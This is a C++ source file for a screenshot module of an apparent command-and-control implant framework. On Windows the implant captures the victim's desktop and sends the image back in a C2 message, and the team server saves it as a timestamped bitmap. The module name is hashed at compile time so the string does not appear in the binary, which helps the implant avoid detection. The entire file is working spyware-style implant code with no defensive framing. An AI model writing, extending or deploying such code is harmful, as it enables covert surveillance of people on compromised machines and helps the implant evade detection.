#include "ScreenShot.hpp"

#ifdef _WIN32
// https://github.com/apriorit/Screenshot_Desktop/tree/master
#include "ScreenShooter.h"
#endif

#include "Common.hpp"

#include <cstring>
#include <chrono>
#include <sstream>

using namespace std;


// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
constexpr std::string_view moduleName = "screenShot";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32
__declspec(dllexport) ScreenShot* ScreenShotConstructor() 
{
    return new ScreenShot();
}
#else
__attribute__((visibility("default"))) ScreenShot* ScreenShotConstructor() 
{
    return new ScreenShot();
}
#endif


ScreenShot::ScreenShot()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}


ScreenShot::~ScreenShot()
{
}


std::string ScreenShot::getInfo()
{
    std::string info;
    // TODO: add screenshot every x seconds with a recurringExec
#ifdef BUILD_TEAMSERVER
    info += "ScreenShot:\n";
    info += "ScreenShot\n";
    info += "exemple:\n";
    info += "- ScreenShot\n";
#endif
    return info;
}


int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
    if (splitedCmd.size() >= 1 )
    {
        c2Message.set_instruction(splitedCmd[0]);    
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}


#define ERROR_OPEN_FILE 1 


int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    c2RetMessage.set_instruction(c2RetMessage.instruction());

#ifdef _WIN32
    std::vector<unsigned char> dataScreen;
    ScreenShooter::CaptureScreen(dataScreen);

    std::string buffer(dataScreen.begin(), dataScreen.end());
    c2RetMessage.set_data(buffer);

    c2RetMessage.set_returnvalue("Success");
#endif    

    return 0;
}


int ScreenShot::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==ERROR_OPEN_FILE)
            errorMsg = "Failed: Couldn't open file";
    }
#endif
    return 0;
}


std::string getFilenameTimestamp() 
{
    auto now = std::chrono::system_clock::now();
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);

    std::tm local_time;
#ifdef _WIN32
    localtime_s(&local_time, &now_time);
#else
    localtime_r(&now_time, &local_time);
#endif

    // Format the timestamp
    std::ostringstream oss;
    oss << std::put_time(&local_time, "%Y%m%d_%H%M%S");
    return oss.str();
}


int ScreenShot::recurringExec(C2Message& c2RetMessage) 
{
    // TODO
    
    return 1;
}


// TODO save the screenshot in a pre defined directory
int ScreenShot::followUp(const C2Message &c2RetMessage)
{
#ifdef BUILD_TEAMSERVER
    const std::string buffer = c2RetMessage.data();

    if(buffer.size()>0)
    {
        std::string outputFile = "screenShot" + getFilenameTimestamp() + ".bmp";
        std::ofstream output(outputFile, std::ios::binary);
        output << buffer;
        output.close();
    }
#endif

    return 0;
}
